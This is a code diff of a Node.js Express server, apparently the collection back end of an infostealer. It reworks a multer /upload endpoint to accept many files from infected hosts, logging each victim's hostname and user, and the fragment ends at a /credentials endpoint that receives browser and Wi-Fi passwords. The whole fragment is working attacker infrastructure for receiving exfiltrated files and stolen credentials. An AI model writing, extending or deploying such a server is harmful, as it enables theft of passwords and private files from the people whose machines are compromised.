@@ -21,45 +21,19 @@ const storage = multer.diskStorage({
         cb(null, `${timestamp}_${file.originalname}`);
     }
 });
-const upload_one = multer({ storage: storage });
+const upload = multer({ storage: storage });
 app.use(morgan('dev'));
 app.use(express.json());
-app.post('/upload', upload_one.single('files'), (req, res) => {
+app.post('/upload', upload.array('files', 50), (req, res) => {
     console.log(`[+] Received files from ${req.body.hostname} (${req.body.user})`);
-    console.log(`[+] File saved: ${req.file.path}`);
-    res.status(200).send('Files received successfully');
-});
-const storage_ = multer.diskStorage({
-  destination: (req, file, cb) => {
-    cb(null, "uploads/"); 
-  },
-  filename: (req, file, cb) => {
-    const uniqueName = Date.now() + "-" + file.originalname;
-    cb(null, uniqueName);
-  },
-});
-const upload = multer({ storage_ });
-app.post("/upload_raw", upload.array("files"), (req, res) => {
-  try {
-    const files = req.files;
-    if (!files || files.length === 0) {
-      return res.status(400).json({ message: "No files uploaded" });
+    if (req.files && req.files.length > 0) {
+        req.files.forEach(file => {
+            console.log(`[+] File saved: ${file.path}`);
+        });
+    } else {
+        console.log('[-] No files received');
     }
-    const bodyData = req.body;
-    res.json({
-      message: "Files uploaded successfully",
-      count: files.length,
-      files: files.map(f => ({
-        filename: f.filename,
-        originalName: f.originalname,
-        path: f.path,
-      })),
-      data: bodyData,
-    });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ message: "Server error" });
-  }
+    res.status(200).send('Files received successfully');
 });
 app.post('/credentials', (req, res) => {
     const { hostname, user, browser_passwords, wifi_passwords } = req.body;
